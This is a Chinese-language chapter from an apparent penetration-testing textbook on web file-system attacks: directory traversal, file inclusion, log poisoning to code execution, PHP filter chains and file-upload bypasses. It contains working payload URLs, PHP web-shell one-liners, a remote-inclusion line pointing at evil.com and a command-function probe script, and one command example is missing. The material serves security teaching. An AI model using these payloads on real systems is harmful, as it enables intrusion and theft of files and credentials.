# 第 6 章 Web 应用程序文件系统攻击

## 6.1 引言

“文件系统攻击”一词泛指因文件系统被访问或操作方式不当而产生的一类漏洞。这包括目录遍历、文件包含和文件上传攻击。在本章中，我们将探讨每种攻击类型以及攻击者如何利用它们。每个攻击向量都利用了输入验证不当、文件系统权限配置错误或服务器设置不正确等问题。我们将涵盖目录遍历攻击及其影响，随后是文件包含漏洞、本地文件泄露，最后是文件上传攻击及其规避限制的技术。

## 6.2 目录遍历攻击

Web 应用程序有时需要允许加载本地资源的功能，这些资源可能包括文本、图像、视频等。如果应用程序使用用户控制的输入参数来查找和加载资源，并且在使用这些参数构造本地系统上的资源路径之前未对其进行清理，则此行为可能导致目录遍历漏洞。

例如，考虑一个允许用户根据“filename”参数中提供的输入加载文件的应用程序。

**代码**
```php
<?php
$file = $_GET['file']; // 用户提供的输入
$path = '/var/www/files/'; // 基础目录

// 读取文件
$contents = file_get_contents($path . $file);
// 显示文件内容
echo $contents;
?>
```

应用程序按以下方式构造 URL：

**示例**
```
http://vulnerabledomain.com/tmgm.php?file=accounts.pdf
```

因此，应用程序将使用参数 `file` 在本地文件系统上查找名为 `accounts.pdf` 的资源。在这种情况下，借助点点斜杠 `../` 序列，用户可以向上遍历当前目录之上的目录树。

例如，在基于 Unix/Linux 的系统中，我们可以尝试访问 `/etc/passwd` 文件。该文件在 Unix/Linux 系统中特别值得关注，因为它包含用户名、用户 ID 等关键信息。值得注意的是，该文件对系统上的所有用户都是可读的。

**POC**
```
http://vulnerabledomain.com/tmgm.php?file=../../etc/passwd
```

在此场景中，我们使用相对路径寻址，从当前目录向上遍历两级以到达根目录。

**注意**：即使我们的根文件夹位于当前目录之上三级，我们仍然可以通过使用五个斜杠序列（即 `/../../../../../etc/passwd`）来访问它。这是因为底层操作系统在到达根目录后会忽略所有 `../`。

对于基于 Windows 的系统，根据版本不同，你可以尝试访问 `win.ini` 和 `boot.ini` 文件。注意，由于 Windows 目录结构，我们使用反斜杠 `..\` 而不是正斜杠 `../`。

**有效载荷**
```
http://vulnerabledomain.com/tmgm.php?file=..\..\..\win.ini
http://vulnerabledomain.com/tmgm.php?file=..\..\..\boot.ini
http://vulnerabledomain.com/tmgm.php?file=..\..\..\system.ini
http://vulnerabledomain.com/tmgm.php?file=..\..\..\pagefile.sys
```

在实际应用程序中，根据当前在路径中的位置，可能需要遍历多个目录。以下 POC 来自一个真实的渗透测试场景。在这种情况下，必须向上遍历多个目录才能到达根目录，最后访问 `/etc/passwd`。

**POC：**
```
https://vulnerable.com/index.php?r=attachment/read&user=pentest&file=lsp%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

**图 6.1 目录遍历导致 /etc/passwd 文件内容泄露**

**注意**：URL 编码 `%2f` 表示正斜杠（`/`），在 Unix/Linux 系统中用作目录分隔符。应用程序在运行时解码 URL，将 `%2f` 转换回 `/`，从而处理预期的目录遍历。

## 6.3 Node.js 应用程序中的目录遍历

目录遍历攻击在所有编程语言中都很常见。让我们看一个真实的渗透测试案例。查看 Node.js（一种流行的服务器端 JavaScript 运行时）中存在目录遍历漏洞的代码，出于保密考虑，细节已修改。

该案例涉及使用 Express.js 框架创建的 Node.js 服务器。该代码从与脚本本身位于同一目录的“Static”目录中提供静态文件。如果请求的文件存在，则获取并读取其内容，如果不存在，服务器将发送 404 错误，消息为“File not found”。让我们看一下易受攻击的代码：

**易受攻击的代码**
```javascript
const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const port = 3000;

// 定义路由来处理 /static/* 下的 GET 请求
app.get('/static/*', (req, res) => {
    // 构造所请求文件的完整路径
    let filePath = path.join(__dirname, 'static', req.params[0]);
    // 尝试读取所请求的文件
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.status(404).send('File not found');
        } else {
            // 否则，发送文件内容作为响应
            res.send(data);
        }
    });
});

app.listen(port, () => console.log(`Server is running on port ${port}`));
```

该代码存在目录遍历漏洞，因为它没有清理用户提供的输入，因此我们可以使用点点斜杠访问当前目录之外的文件。然而，与之前的漏洞不同，此问题存在于路径名中，而非输入参数中。

例如，使用以下命令将允许攻击者读取基于 Unix/Linux 的系统上的 `/etc/passwd` 文件内容：

**命令**
```bash
echo; curl --path-as-is http://localhost:3000/static/../../../../../../../etc/passwd
```

**图 6.2 目录遍历导致 /etc/passwd 文件暴露**

在此命令中，`curl --path-as-is` 向指定 URL 发出请求，而不删除点点斜杠序列，从而利用目录遍历漏洞。

值得注意的是，根据分配给 Web 应用程序的权限，漏洞的影响可能会有很大差异，尤其是在应用程序以 root 或系统级权限运行的情况下。例如，考虑 Unix/Linux 系统中的 `/etc/shadow` 文件。该文件通常只能由 root 用户访问，包含系统用户的哈希密码。获得此文件访问权限的攻击者可以尝试破解密码哈希，并可能入侵用户帐户，从而在这个过程中提升权限。

在我们最近进行的一次真实渗透测试中，我们发现一台服务器以其 Web 应用程序以 root 用户身份运行。由于具有 root 级权限，我们能够导航到 `/root/.ssh/id_rsa` 文件并访问其中的私有 SSH 密钥。这使我们能够获得对底层主机的访问权限。

**图 6.3 目录遍历导致 SSH 私钥暴露**

## 6.4 使用 FFUF 模糊测试内部文件

在识别出易受攻击的端点后，进行模糊测试以定位内部文件是有益的。为此，你可以使用前面章节中讨论过的“ffuf”（Fuzz Faster U Fool）工具，该工具可以提供相当大的帮助。

**命令**
```bash
ffuf -w file-names.txt -u 'http://example.com/lfi.php?file=../../../../../FUZZ' -r
```

此命令指示 ffuf 使用来自 `file-names.txt` 的不同文件路径模糊测试给定的 URL，旨在识别可能因本地文件包含（LFI）漏洞而被访问的任何潜在文件。`-r` 选项用于确保 ffuf 跟随重定向。

### 6.4.1 目录遍历与任意文件创建漏洞

在对托管在 Windows 服务器上的应用程序进行真实渗透测试期间，我们在 `createfile.aspx` 端点中发现了一个漏洞。该端点使用用户提供的 `Files` 参数来构造路径名。由于缺少输入清理，它容易受到目录遍历攻击。因此，通过利用此弱点，可以使用点点斜杠技术操纵路径名以访问当前目录之外的文件。

此外，我们观察到应用程序检索本地文件的内容（通过 `Files` 参数指定），并将其保存到通过 `Name` 参数设置的任意文件名，从而导致任意文件创建漏洞。此行为导致任意文件创建漏洞。

例如，通过使用特定的输入，我们成功地将系统 `WINDOWS/system32/drivers/etc/hosts` 文件的内容保存到 `/js/` 目录中名为 `hello.txt` 的新文件中。以下是将这两个漏洞结合起来的请求示例：

**请求**
```
POST /forjitek/src/WebGui_2020/maintain/CreateFile.aspx HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: http://example.com
Connection: close
Cookie: REDACTED

Files=../../../../../../../../../WINDOWS/system32/drivers/etc/hosts;&Name=hello.txt
```

## 6.5 文件包含漏洞

许多编程语言，包括 PHP、Java、ASP 和 JSP，都支持动态包含文件的功能。此功能对于标准化和重用代码很有用。根据这些包含的实现方式，它们可能被利用来执行任意代码。然而，值得注意的是，由于现代 Web 应用程序中模板的广泛采用，此类函数的使用已变得不那么常见。

目录遍历和文件包含之间的主要区别在于，文件包含漏洞侧重于利用包含任意文件，这可能导致远程代码执行（RCE）或信息泄露，而目录遍历侧重于访问系统中的任意文件，导致信息泄露。然而，根据应用程序的上下文，目录遍历也可能导致 RCE，例如，在上一节的示例中，目录遍历被用于读取私有 SSH 密钥以获得访问权限。

文件包含漏洞与目录遍历漏洞的不同之处主要在于其可利用性和潜在影响。文件包含问题涉及动态包含文件的利用，这可能导致 RCE 或敏感信息泄露。另一方面，目录遍历漏洞侧重于获取对系统中任意文件的未授权访问，通常导致信息泄露。

然而，根据应用程序的上下文，目录遍历也可能导致 RCE。例如，在上一节讨论的场景中，目录遍历被利用来读取私有 SSH 密钥并获得未授权访问。

PHP 尤其是一种主要发现文件包含漏洞的语言，因为它具有广泛的功能和广泛的使用。某些常用的 PHP 函数可能被滥用来利用这些漏洞。

**示例：**
- `include()`
- `include_once()`
- `require()`
- `require_once()`

除此之外，其他函数如 `fopen()` 和 `file_get_contents()` 也不应被忽视，它们在某些情况下也可能受到文件包含漏洞的影响。

为了更好地理解，让我们考虑以下易受 LFI 漏洞攻击的 PHP 脚本：

**代码**
```php
<?php
$location = $_GET['location'];
include("weather_data/" . $location . ".php");
?>
```

该 PHP 脚本根据用户提供的输入参数 `location` 使用 `include()` 函数动态包含文件。然后，脚本使用与用户位置对应的文件来显示相关的天气数据。例如，网站可能使用类似 `http://vulnerabledomain.com/index.php?location=Islamabad` 的 URL 来显示特定于“Islamabad”的天气数据。

然而，由于 `location` 参数在通过 `include()` 函数动态加载之前未经清理，这种方法也引入了文件包含漏洞。因此，我们可以通过 `location` 参数提交任何有效的本地路径，以包含预期目录之外的文件。例如，攻击者可以请求 UNIX 的 `/etc/passwd` 文件，如下所示：

**POC**
```
http://vulnerabledomain.com/index.php?location=../../../etc/passwd
```

如果攻击者设法控制了绝对路径，则上述函数可能被利用于远程文件包含（RFI）攻击。在 RFI 攻击中，应用程序将包含并执行远程文件，可能导致 RCE。以下是可利用 URL 的样子：

**POC**
```
http://vulnerabledomain.com/index.php?location=http://evil.com/shell.txt
```

在此场景中，`shell.txt` 文件包含将被包含到网页中并由服务器执行的 PHP 代码。要使代码成功执行，关键的是 `shell.txt` 文件必须托管在远程位置，并作为纯文本文件提供。

值得注意的是，RFI 在近些年已变得不那么普遍。现代 PHP 安装通常默认禁用 `allow_url_include` 和 `allow_url_fopen` 设置，从而防止包含远程文件。

### 6.5.1 本地文件包含到远程代码执行

如前所述，LFI 可以升级为 RCE。有多种技术可以实现此目的，其中许多在我的上一本书《道德黑客与渗透测试指南》中讨论过。但在本节中，我们将深入探讨在当今 Web 应用程序中仍然相关且适用的技术。

### 6.5.2 通过 Apache 日志文件从 LFI 到 RCE

使用 LFI 实现 RCE 的目标是尝试加载本地文件，如日志文件。其中一种技术称为日志文件注入。日志文件包含对服务器发出的所有请求的记录，包括客户端 IP 地址、请求的 URL、用户代理等。通过将恶意 PHP 代码注入到请求中被记录的部分（例如通过操纵 HTTP 请求中的用户代理数据），可以污染这些日志文件。

之后，通过使用 LFI，可以强制服务器加载包含恶意 PHP 代码的日志文件并执行它。让我们考虑一个托管在 Apache Web 服务器上的易受 LFI 攻击的应用程序的示例，其中日志文件通常位于 `/var/log/apache2/access.log`。用于加载日志文件的 POC URL 如下：

**POC**
```
http://demo-site.local:8080/lfi.php?file=/var/log/apache2/access.log
```

输出显示 Apache Web 服务器的日志文件内容。

**图 6.5 目录遍历导致 Apache 日志文件暴露**

接下来，为了污染用户代理，我们将构造一个包含恶意 PHP 代码的请求，该代码通过 `cmd` 参数执行系统命令：

**命令**
```bash
curl -I http://demo-site.local:8080/ -A "<?php system($_GET['cmd']);?>"
```

**图 6.6 使用 curl 命令注入 shell 代码**

`-A` 标志用于设置用户代理字符串，注入我们的 PHP 代码。由于日志文件已被污染，一旦通过 LFI 加载，代码将被解释为 PHP。触发执行的示例 URL 可能如下：

**POC**
```
http://demo-site.local:8080/lfi.php?file=/var/log/apache2/access.log&cmd=id
```

在此情况下，`id` 命令将在服务器上执行，演示成功的 RCE。

**图 6.7 输出显示 `id` 命令的响应**

日志文件可能位于不同的目录，具体取决于 Web 服务器的类型及其配置。有关在模糊测试期间可以定位的更多潜在日志文件位置，请参考此详尽列表：[https://raw.githubusercontent.com/nixawk/fuzzdb/master/attack/lfi/LFI-linux-httpd-log.txt](https://raw.githubusercontent.com/nixawk/fuzzdb/master/attack/lfi/LFI-linux-httpd-log.txt)。

### 6.5.3 通过 SSH 认证日志从 LFI 到 RCE

在日志文件不可访问或不在可预测位置的情况下，值得尝试访问 SSH 认证日志。这些日志包含用户名、密码以及帐户认证失败或成功等详细信息。

与访问日志类似，SSH 日志也可以被我们的 PHP 代码污染。这可以通过首先向目标机器进行 SSH 登录尝试，然后使用恶意有效载荷作为用户名来实现，例如 `<?php system($_GET["c"]);?>`。

**POC**
```
http://demo-site.local:8080/lfi.php?file=/var/log/auth.log&c=id
```

### 6.5.4 使用 PHP 包装器和协议从 LFI 到 RCE

在访问常见途径（如日志文件）受到限制的情况下，你可以利用 PHP 过滤器。PHP 过滤器是 PHP 的一个内置功能，使开发人员能够验证和清理输入。然而，它们可能是一把双刃剑，因为它们也可以被武器化以利用 LFI 漏洞。

其中一个常用的文件系统过滤器是 `php://filter`，它允许开发人员将文件内容转换为 base64 编码。例如，以下命令可用于读取位于 `/var/www/mutillidae/config.inc` 的配置文件。

**POC**
```
http://demo-site.local:8080/lfi.php?file=php://filter/convert.base64-encode/resource=/var/www/mutillidae/config.inc
```

**图 6.10 config.inc 文件的 Base64 编码响应**

在某些条件下，如果攻击者完全控制了传递给 PHP 的 `Require` 或 `include` 函数的用户输入，PHP 过滤器可能导致 RCE。可能发生的一种情况是，如果 PHP 设置 `allow_url_include` 已启用（在现代 PHP 版本中通常禁用）。

为了自动化此过程，可以使用像“PHPFilterChainGenerator”[https://github.com/synacktiv/php_filter_chain_generator] 这样的工具。该工具旨在自动化创建过滤器链，可以将无害字符串转换为恶意有效载荷。本质上，这是通过欺骗 PHP 解释器将恶意有效载荷当作常规字符串处理并执行来实现的。

例如，以下命令可用于生成一个 PHP 过滤器链，该链将返回 `id` 命令的结果：

**命令**
```bash
python3 php_filter_chain.py --chain '<?php system("id");?>'
```

**图 6.11 输出显示通过注入的 PHP 过滤器链执行 `id` 命令的响应**

### 6.5.5 通过竞争条件从 LFI 到 RCE

在 Brett Moore 于 2011 年发表的一篇题为“LFI with PHPInfo() Assistance”的研究论文中，揭示了一种使用竞争条件利用 LFI 的新方法 [https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf]。为了有效利用此技术实现 RCE，需要满足以下前提条件：

(i) 应用程序必须存在 LFI 漏洞。  
(ii) PHPInfo 文件必须可访问。  
(iii) `php.ini` 文件中的 `file_uploads` 配置必须启用。

要理解此漏洞，必须了解 PHP 引擎如何处理文件上传以及 PHPInfo() 函数的作用。当在 PHP 中上传文件时，它最初存储在临时目录中，并在短时间内被删除。该目录的位置是随机的，因此无法预测。然而，PHPInfo() 函数可用于揭示随机文件名，因为它包含所有 PHP 变量的值。

在 LFI 漏洞的上下文中，此行为可以被滥用以实现 RCE。以下是可能发生的逐步过程：

(i) 攻击者上传一个恶意 PHP 文件，其中包含一个执行命令的函数，例如 `<?php system($_GET['cmd']);?>`。  
(ii) 同时，攻击者迅速向 PHPInfo() 页面发起请求，试图在文件仍存在于临时目录时捕获其输出。

**请求**
```
POST /phpinfo.php HTTP/1.1
Host: demo-site.local:8080
Content-Type: multipart/form-data; boundary=-----------------------------7db268605ae
Content-Length: 187

-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="tmgm.txt"
Content-Type: text/plain

Test
-----------------------------7db268605ae
```

(iii) 根据 PHPInfo() 文件的输出，攻击者确定包含我们 PHP 代码的上传文件的临时路径和文件名。

**图 6.12 PHPInfo 文件输出显示我们文件的临时路径和文件名**

(iv) 使用 LFI 漏洞，攻击者在临时文件从服务器上被删除之前包含它。

**注意**：此方法依赖于利用竞争条件漏洞，因此攻击者应快速通过 LFI 包含临时文件，以免 PHP 的垃圾回收将其从临时目录中删除。

幸运的是，研究人员已经编写了脚本来简化利用过程。以下脚本试图利用该条件 [https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py]。

执行脚本所需的命令如下：

**命令**
```bash
Python2 exp.py demo-site.local 8080 100
```

## 6.6 本地文件泄露

本地文件泄露（LFD）可以被视为 LFI 漏洞的一个子集。LFD 漏洞可能导致本地文件暴露，有时可能导致访问敏感文件，如配置文件、SSH 私钥等，可能导致信息泄露甚至 RCE。

该漏洞主要出现在 PHP 中，因为 `readfile()` 函数被广泛使用。类似地，如果 `file_get_contents()` 函数未经适当清理，也可能成为此漏洞的向量。其他编程语言也有类似的函数，可以被利用以达到相同的效果。

为了理解这一点，让我们考虑以下 PHP 代码：

**易受攻击的代码**
```php
<?php

$read = readfile($file);
?>
```

在此代码中，通过 `file` 参数获取的用户输入直接传递给 `readfile` 函数。该函数负责读取文件并将其内容保存到输出缓冲区。由于没有验证，可以操纵输入以遍历目录并访问本地文件。

## 6.7 文件上传攻击

文件上传是 Web 应用程序中非常常见的功能，你几乎会在所有 Web 应用程序中找到它。如果 Web 应用程序未对用户上传的文件实施适当的限制，则可能导致无限制文件上传。虽然此漏洞的后果高度依赖于允许的文件扩展名类型以及应用程序如何处理上传的文件。根据情况，无限制文件上传可能导致拒绝服务（DoS）、存储型 XSS，甚至导致远程代码执行。

要使应用程序容易受到文件上传漏洞的影响，以下任何一个因素都可能是促成因素：

- **缺少文件类型检查**：应用程序不验证上传的文件是否与允许的安全格式白名单匹配。这意味着任何文件，包括恶意脚本，都可以上传到目标服务器。
- **宽松的文件夹权限**：上传文件的文件夹允许执行服务器端脚本。
- **可预测的文件名和路径**：上传文件的文件名和路径位于可预测的位置。

此外，即使文件上传被限制为无害扩展名（如文本文件或 JPEG），如果应用程序的其他地方存在文件包含漏洞，它们仍然容易被利用。

必须在此提到，如果负责处理文件的底层库存在漏洞，则没有文件格式是完全安全的。例如，过去曾在图像解析器中发现了漏洞，这些漏洞可能允许特制图像执行代码。

为了更好地说明这一点，让我们考虑一个具有文件上传功能的简单 Web 应用程序示例：

### 6.7.1 PHP 禁用函数

在渗透测试期间，很常见会遇到某些函数可能导致执行系统命令的场景。这是通过 `php.ini` 文件中的 `disable_functions` 指令实现的，尤其是在共享托管环境中。

虽然管理员通常维护黑名单以限制潜在危险的函数，但值得注意的是，PHP 有一个可用于执行命令的替代函数列表：

**表 6.1 用于执行命令的 PHP 替代函数**

| 名称          | 功能                                                         |
|---------------|--------------------------------------------------------------|
| system        | 执行命令并返回其输出                                         |
| shell_exec    | 执行命令并立即显示输出                                       |
| passthru      | 执行命令并显示原始输出                                       |
| popen         | 执行命令并返回指针                                           |
| exec          | 执行命令并返回输出的最后一行                                 |
| proc_open     | 类似于 popen()                                               |

此过程可以通过创建脚本来自动化，该脚本将遍历这些函数列表，并尝试执行命令 `uname -a`。如果没有任何函数起作用，脚本将返回“All functions were disabled”。

**代码**
```php
<?php
define("CMD", "uname -a");
$list = array(
    "exec",
    "passthru",
    "shell_exec",
    "system",
    "popen",
    "proc_open",
    "eval",
    "assert",
    "pcntl_exec",
    "backticks",
    "expect_popen",
    "expect_expectl"
);
$flag = false;
echo "<h2>Enabled Functions on the Web Server</h2>";
foreach ($list as $func) {
    if (function_exists($func)) {
        $flag = true;
        echo "<b>$func:</b>";;
        echo "<pre>";
        switch ($func) {
            case "popen":
                $hWnd = $func(CMD, 'r');
                $output = fread($hWnd, 4096);
                echo $output;
                pclose($hWnd);
                break;
            case "proc_open":
                $descriptorspec = array(
                    0 => array("pipe", "r"),
                    1 => array("pipe", "w"),
                    2 => array("file", "/tmp/error-output.txt", "a")
                );
                $process = $func(CMD, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    echo stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($process);
                }
                break;
            default:
                echo $func(CMD);
                break;
        }
        echo "</pre>";
        echo "<br/>";
    }
}
if ($flag == false) {
    echo "<b>No functions were enabled to execute commands.</b>";
}
?>
```

以下截图显示了包含目标服务器上启用的函数的脚本输出：

**图 6.21 Web 服务器上启用的 shell 函数输出**

经典 ASP 和 ASP.NET 以及 Java 都有执行 shell 命令的机制。然而，PHP 的内置函数在并排比较时可能看起来更多。例如，经典 ASP 主要依赖 `WScript.Shell` 的 `Exec` 方法，ASP.NET 利用 `Process.Start(processName)`，基于 Java 的应用程序通常使用 `Runtime.getRuntime().exec(command)`。

## 6.8 绕过文件上传限制

多年来，文件上传功能经常成为攻击者的目标。作为回应，开发人员设计了各种防御机制。然而，许多这些防御策略已被绕过，促使进一步演进。以下是一些常见的防御机制及其潜在的绕过方法：

### 6.8.1 绕过客户端验证

开发人员通常使用 JavaScript 进行客户端验证，以将文件上传限制为特定扩展名。然而，这种方法存在一个漏洞：一旦数据离开浏览器，这些客户端防御就变得无效。这种弱点在使用 Web 代理时尤为明显，代理允许用户在将文件传输到服务器之前更改文件扩展名。

为了清晰起见，考虑一个客户端验证检查允许的图像文件扩展名的示例：

**易受攻击的代码**

```javascript
    var allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    if (!allowedExtensions.includes(fileExtension)) {
        alert('Only image files are allowed to be uploaded.');
        return false;
    }
}
```

### 6.8.2 绕过基于黑名单的过滤器

开发人员通常维护一个不允许上传的扩展名列表。然而，仅依赖这种方法可能导致绕过。鉴于文件扩展名及其潜在变体的数量巨大，总有可能规避这些限制。

为了说明，考虑以下代码，它维护了一个黑名单，包含 `php`、`exe`、`js` 和 `html` 等扩展名。

**易受攻击的代码**
```php
<?php
if (isset($_FILES['uploaded_file'])) {
    $target_file = "uploads/" . basename($_FILES['uploaded_file']['name']);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    // 定义不允许的扩展名黑名单
    $blacklist = array("php", "exe", "pdf", "html");
    if (in_array($imageFileType, $blacklist)) {
        echo 'php, exe, js and html files are not allowed! ';
    } else {
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
            echo "The file " . basename($_FILES['uploaded_file']['name']) . " has been uploaded.";
        }
    }
}
?>
```

如果服务器配置为执行 PHP 脚本，我们可以通过使用 `phtml` 扩展名上传 PHP 代码来绕过限制。这是因为在某些配置中，Web 服务器对待 `phtml` 文件的方式与对待 `.php` 文件的方式相同。

### 6.8.4 MIME 类型验证绕过

开发人员采用的另一种常见保护方法是根据文件的 MIME 类型允许或拒绝文件。MIME 类型指示媒体类型，指定文档的性质和格式。例如，如果服务器接受 `image/jpeg`，则指示服务器仅允许 JPEG 文件。

然而，当上传 PHP 文件时，它将具有不同的 MIME 类型，通常是 `application/x-httpd-php`。由于开发人员不允许上传 `application/x-httpd-php` MIME 类型，因此文件不会被上传。

为了说明这一点，让我们检查以下代码，它仅接受具有 MIME 类型 `image/gif` 或 `image/jpeg` 的文件：

**易受攻击的代码**
```php
<?php
if (isset($_FILES['uploaded_file'])) {
    $target_file = "uploads/" . basename($_FILES['uploaded_file']['name']);
    if ($_FILES['uploaded_file']['type'] != "image/gif" && $_FILES['uploaded_file']['type'] != "image/jpeg") {
        echo "Not allowed! Only Image Files are allowed.";
    }
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
        echo 'File uploaded successfully! ' . $target_file;
    }
}
?>
```

为了演示，让我们尝试上传 PHP 文件 `Shell.php`。根据服务器配置，内容类型设置为 `application/x-php`：

**图 6.28 错误消息指示文件上传需要提供图像文件**

从截图中可以明显看出，由于 MIME 类型不匹配，服务器拒绝了该文件。然而，当将内容类型修改为 `image/gif` 时，文件 `shell.php` 被上传，从而绕过了限制。

**图 6.29 确认 Shell.php 文件成功上传到 uploads 目录**

### 6.8.5 绕过 Magic Bytes

考虑服务器检查图像文件内容（特别是 PNG 文件）的场景。此验证通过使用 magic bytes 来完成。Magic bytes 是位于文件开头的特定字节序列，用作标识文件格式或内容类型的唯一签名。以下是 PNG、JPEG 和 GIF 文件的 magic bytes 表：

**表 6.2 PNG、JPEG 和 GIF 文件的 Magic Bytes**

| 文件类型 | Magic Bytes（十六进制）                  |
|----------|-------------------------------------------|
| PNG      | `89 50 4E 47 0D 0A 1A 0A`                 |
| JPEG     | `FF D8 FF`                                 |
| GIF      | `47 49 46 38 39 61`（适用于 GIF87a）       |

在应用程序仅依赖 Magic Bytes 进行图像验证并允许上传任何扩展名的情况下，攻击者可以通过在图像中注入 PHP 代码来绕过此保护。让我们探讨几种将 PHP 代码注入图像的方法。

### 6.8.6 方法 1：通过 EXIF 数据注入

EXIF 格式被图像用于在图像文件中存储元数据。绕过 magic bytes 保护的一种方法是将恶意 PHP 代码注入 EXIF 数据中。为此，可以使用 `exiftool`。以下代码将 php 代码注入 EXIF 标头，并将图像保存为 `1.png`。

**命令**
```bash
exiftool -comment="<?php system($_GET['cmd']); ?>" 1.png
```

**图 6.30 通过 exiftool 显示的 1.png 标头输出显示注入的 PHP 代码**

接下来，为了绕过 magic bytes 保护，文件被重命名为 `.php` 并上传到服务器。上传后，服务器检查 magic bytes 的存在。如果找到，服务器将解析嵌入在图像中的 PHP 代码，并执行 `cmd` 参数中指定的命令：

**图 6.31 输出显示通过 1.php 文件执行 whoami 命令的响应**

### 6.8.7 方法 2：原始插入

在某些情况下，服务器可能会从上传的文件中删除 EXIF 数据。这可能是出于隐私考虑，因为 EXIF 数据可能包含潜在的敏感信息，如 GPS 坐标。或者，服务器可能未配置为处理 EXIF 数据。在这种情况下，一种可能的解决方案是向图像执行原始插入。以下命令将 PHP 代码插入 PNG 图像：

**命令**

### 6.8.8 图像解析库中的漏洞

图像解析器是许多软件栈中负责处理图像数据的核心组件。图像解析器中的漏洞可能使即使安全实现的文件上传功能也变得脆弱。根据漏洞的性质，可能可以制作一个具有标准扩展名（如 JPG、GIF 或 PNG）的图像，用于读取文件甚至执行系统上的代码。

## 6.9 额外进阶

- **各种图像解析器中的漏洞**：尝试复现已知漏洞并深入研究这些问题的根本原因。
- **绕过 disable_functions**：探索可用于绕过 `disable_functions` 的各种技术。这可能涉及上传 Python 或 Perl 等语言的 shell，甚至利用反向 shell。

- **文件上传绕过**：探索使用附加空字节或利用双扩展名等技术绕过文件上传限制。
